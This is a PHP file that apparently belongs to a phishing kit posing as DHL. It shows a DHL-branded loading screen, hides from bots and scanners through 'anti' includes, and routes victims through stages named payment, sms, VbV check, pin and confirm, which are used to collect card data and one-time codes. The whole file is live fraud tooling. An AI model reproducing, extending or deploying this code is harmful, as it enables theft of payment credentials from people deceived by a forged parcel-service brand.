<?php
include "../prevents/anti1.php";
include "../prevents/anti2.php";
include "../prevents/anti3.php";
include "../prevents/anti4.php";
include "../prevents/anti5.php";
include "../prevents/anti6.php";
include "../prevents/anti7.php";

include "Config/panel.php";


if (isset($_SESSION['MASTER'])) {

    antibotpw();
    require "lang.php";

if ($_GET['view'] == 'explain') {
    header("Refresh: 3; url=./explain.php?&userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'infoz') {
  header("Refresh: 3; url=./infoz.php?&userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'payment') {
  header("Refresh: 3; url=./payment.php?&userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'sms') {
    header("Refresh: ".TIMER."; url=./sms.php?&userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'check') {
    header("Refresh: ".TIMER."; url=./Panel/botActVbv/vbv_act.php?userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'pin') {
    header("Refresh: 3; url=./pin.php?&userid={$id}&ue={$ue}");
}
elseif ($_GET['view'] == 'confirm') {
    header("Refresh: 3; url=./confirm.php?&userid={$id}&ue={$ue}");
}
else {
    header("Refresh: 3; url=./index.php?&userid={$id}&ue={$ue}");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DHL</title>
</head>
<style>
    * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
    }
    div {
        background-color: #fc0;
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100vw;
        height: 100vh;
    }
    img {
            
            transform: scale(1);
            animation: pulse 2s infinite
        }
        

@keyframes pulse {
   0% { transform: scale(1); }
     50% { transform: scale(1.2); }
     100% { transform: scale(1); }
}
</style>
<body>

<div>


<img src="./styles/dhl-logo.svg" alt="" srcset="">

</div>


    
</body>
</html>
<?php
}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}


?>